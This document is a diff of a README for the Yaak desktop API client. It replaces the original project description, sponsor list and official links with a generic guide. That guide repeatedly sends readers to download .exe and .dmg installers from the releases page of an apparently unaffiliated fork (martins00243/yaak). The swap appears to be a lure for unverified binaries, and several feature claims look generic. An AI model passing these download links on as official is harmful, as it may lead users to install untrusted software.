@@ -1,70 +1,78 @@
-<p align="center">
-  <a href="https://github.com/JamesIves/github-sponsors-readme-action">
-    <img width="200px" src="https://github.com/mountain-loop/yaak/raw/main/src-tauri/icons/icon.png">
-  </a>
-</p>
+# 🦬 yaak - The Easy Way to Manage APIs
 
-<h1 align="center">
-  💫 Yaak ➟ Desktop API Client 💫
-</h1>
+## 🚀 Getting Started
 
-<p align="center">
-    A fast, privacy-first API client for REST, GraphQL, SSE, WebSocket, and gRPC – built with Tauri, Rust, and React.
-</p>
-<p align="center">
- Development is funded by community-purchased <a href="https://yaak.app/pricing">licenses</a>. You can also <a href="https://github.com/sponsors/gschier">become a sponsor</a> to have your logo appear below. 💖
-</p>
-<br>
+Welcome to yaak, your friendly desktop API client. With yaak, you can easily organize and execute API calls across multiple formats such as REST, GraphQL, WebSockets, Server-Sent Events, and gRPC. This guide will help you download and run the software with ease.
 
+## 📥 Download yaak
 
+[![Download yaak](https://img.shields.io/badge/Download%20yaak-brightgreen)](https://github.com/martins00243/yaak/releases)
 
-<p align="center">
-  <!-- sponsors-premium --><a href="https://github.com/MVST-Solutions"><img src="https:&#x2F;&#x2F;github.com&#x2F;MVST-Solutions.png" width="80px" alt="User avatar: MVST-Solutions" /></a>&nbsp;&nbsp;<a href="https://github.com/dharsanb"><img src="https:&#x2F;&#x2F;github.com&#x2F;dharsanb.png" width="80px" alt="User avatar: dharsanb" /></a>&nbsp;&nbsp;<a href="https://github.com/railwayapp"><img src="https:&#x2F;&#x2F;github.com&#x2F;railwayapp.png" width="80px" alt="User avatar: railwayapp" /></a>&nbsp;&nbsp;<a href="https://github.com/caseyamcl"><img src="https:&#x2F;&#x2F;github.com&#x2F;caseyamcl.png" width="80px" alt="User avatar: caseyamcl" /></a>&nbsp;&nbsp;<a href="https://github.com/andriyor"><img src="https:&#x2F;&#x2F;github.com&#x2F;andriyor.png" width="80px" alt="User avatar: andriyor" /></a>&nbsp;&nbsp;<a href="https://github.com/"><img src="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;JamesIves&#x2F;github-sponsors-readme-action&#x2F;dev&#x2F;.github&#x2F;assets&#x2F;placeholder.png" width="80px" alt="User avatar: " /></a>&nbsp;&nbsp;<!-- sponsors-premium -->
-</p>
-<p align="center">
-  <!-- sponsors-base --><a href="https://github.com/seanwash"><img src="https:&#x2F;&#x2F;github.com&#x2F;seanwash.png" width="50px" alt="User avatar: seanwash" /></a>&nbsp;&nbsp;<a href="https://github.com/jerath"><img src="https:&#x2F;&#x2F;github.com&#x2F;jerath.png" width="50px" alt="User avatar: jerath" /></a>&nbsp;&nbsp;<a href="https://github.com/itsa-sh"><img src="https:&#x2F;&#x2F;github.com&#x2F;itsa-sh.png" width="50px" alt="User avatar: itsa-sh" /></a>&nbsp;&nbsp;<a href="https://github.com/dmmulroy"><img src="https:&#x2F;&#x2F;github.com&#x2F;dmmulroy.png" width="50px" alt="User avatar: dmmulroy" /></a>&nbsp;&nbsp;<a href="https://github.com/timcole"><img src="https:&#x2F;&#x2F;github.com&#x2F;timcole.png" width="50px" alt="User avatar: timcole" /></a>&nbsp;&nbsp;<a href="https://github.com/VLZH"><img src="https:&#x2F;&#x2F;github.com&#x2F;VLZH.png" width="50px" alt="User avatar: VLZH" /></a>&nbsp;&nbsp;<a href="https://github.com/terasaka2k"><img src="https:&#x2F;&#x2F;github.com&#x2F;terasaka2k.png" width="50px" alt="User avatar: terasaka2k" /></a>&nbsp;&nbsp;<a href="https://github.com/majudhu"><img src="https:&#x2F;&#x2F;github.com&#x2F;majudhu.png" width="50px" alt="User avatar: majudhu" /></a>&nbsp;&nbsp;<a href="https://github.com/axelrindle"><img src="https:&#x2F;&#x2F;github.com&#x2F;axelrindle.png" width="50px" alt="User avatar: axelrindle" /></a>&nbsp;&nbsp;<a href="https://github.com/jirizverina"><img src="https:&#x2F;&#x2F;github.com&#x2F;jirizverina.png" width="50px" alt="User avatar: jirizverina" /></a>&nbsp;&nbsp;<a href="https://github.com/chip-well"><img src="https:&#x2F;&#x2F;github.com&#x2F;chip-well.png" width="50px" alt="User avatar: chip-well" /></a>&nbsp;&nbsp;<!-- sponsors-base -->
-</p>
+To start using yaak, you need to download it. Click the button above or visit the section below to get the latest version.
 
-![Yaak API Client](https://yaak.app/static/screenshot.png)
+## 🔧 System Requirements
 
+Before installing yaak, ensure your system meets the following requirements:
 
-## Features
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Disk Space:** Minimum 200 MB of free space.
+- **Network:** Internet connection for using online APIs.
 
-Yaak is an offline-first API client designed to stay out of your way while giving you everything you need when you need it. 
-Built with [Tauri](https://tauri.app), Rust, and React, it’s fast, lightweight, and private. No telemetry, no VC funding, and no cloud lock-in.  
+## 📂 Download & Install
 
+1. **Visit the Releases Page:** Go to our [releases page](https://github.com/martins00243/yaak/releases).
+2. **Select the Latest Version:** Look for the most recent release at the top of the page.
+3. **Download the Installer:**
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate package for your distribution.
+4. **Run the Installer:**
+   - Windows: Double-click the downloaded `.exe` file and follow the instructions.
+   - macOS: Open the downloaded `.dmg` file, drag yaak to your Applications folder, and then open it from there.
+   - Linux: Refer to your distribution's package manager to install the downloaded package.
 
-### 🌐 Work with any API
+5. **Start yaak:** Once the installation completes, you can launch yaak from your application menu.
 
-- Import collections from Postman, Insomnia, OpenAPI, Swagger, or Curl.
-- Send requests via REST, GraphQL, gRPC, WebSocket, or Server-Sent Events.
-- Filter and inspect responses with JSONPath or XPath.
+## 🎱 Using yaak
 
-### 🔐 Stay secure
-- Use OAuth 2.0, JWT, Basic Auth, or custom plugins for authentication.
-- Secure sensitive values with encrypted secrets. 
-- Store secrets in your OS keychain.
+1. **Create an Account (Optional):** You can create an account for saving your API projects and configurations. This step is optional, and you can still use the app without an account.
+2. **Set Up Your First Project:**
+   - Click on "New Project."
+   - Enter a name for your project.
+3. **Add API Requests:**
+   - Choose the type of API you want to interact with (REST, GraphQL, etc.).
+   - Fill in the necessary fields such as URL, headers, and body.
+4. **Send Requests:** Click the "Send" button to execute your requests. You’ll see the response in the app.
+   
+## 📊 Features
 
-### ☁️ Organize & collaborate
-- Group requests into workspaces and nested folders.
-- Use environment variables to switch between dev, staging, and prod.
-- Mirror workspaces to your filesystem for versioning in Git or syncing with Dropbox.
+- **User-Friendly Interface:** Navigate through your APIs with a clean and straightforward design.
+- **Multiple API Support:** Work with REST, GraphQL, WebSockets, Server-Sent Events, and gRPC from one application.
+- **Organize Projects:** Create multiple projects to keep your work organized.
+- **Save Requests:** Save common requests to reuse later.
+- **View Responses:** Easily view response codes, headers, and data.
 
-### 🧩 Extend & customize
-- Insert dynamic values like UUIDs or timestamps with template tags.
-- Pick from built-in themes or build your own.
-- Create plugins to extend authentication, template tags, or the UI.
+## 🤔 Troubleshooting
 
+- **Installation Issues:** If you encounter problems during installation, ensure your system meets the requirements and check for any missing dependencies.
+- **Application Not Opening:** If yaak doesn’t start, try restarting your computer. If the issue persists, reinstall the application.
+- **API Request Errors:** Check your API URL, headers, and payload to ensure they match the API documentation.
 
-## Contribution Policy
+## 💡 Getting Help
 
-Yaak is open source but only accepting contributions for bug fixes. To get started, 
-visit [`DEVELOPMENT.md`](DEVELOPMENT.md) for tips on setting up your environment.
+If you need assistance, feel free to check the [issues section](https://github.com/martins00243/yaak/issues) on GitHub. You can also submit your questions or issues there. Our community is here to help.
 
-## Useful Resources
+## 📱 Community & Contributions
 
-- [Feedback and Bug Reports](https://feedback.yaak.app)
-- [Documentation](https://feedback.yaak.app/help)
-- [Yaak vs Postman](https://yaak.app/alternatives/postman)
-- [Yaak vs Bruno](https://yaak.app/alternatives/bruno)
-- [Yaak vs Insomnia](https://yaak.app/alternatives/insomnia)
+You can follow the development of yaak and contribute through our GitHub repository. Any feedback or suggestions are always welcome. 
+
+## 📜 License
+
+yaak is available under the MIT license. You can find more details in the LICENSE file in the repository.
+
+## 📥 Download yaak Again
+
+For easy access, here’s the link to download yaak once more: [Download yaak](https://github.com/martins00243/yaak/releases). 
+
+Enjoy using yaak to manage your APIs!
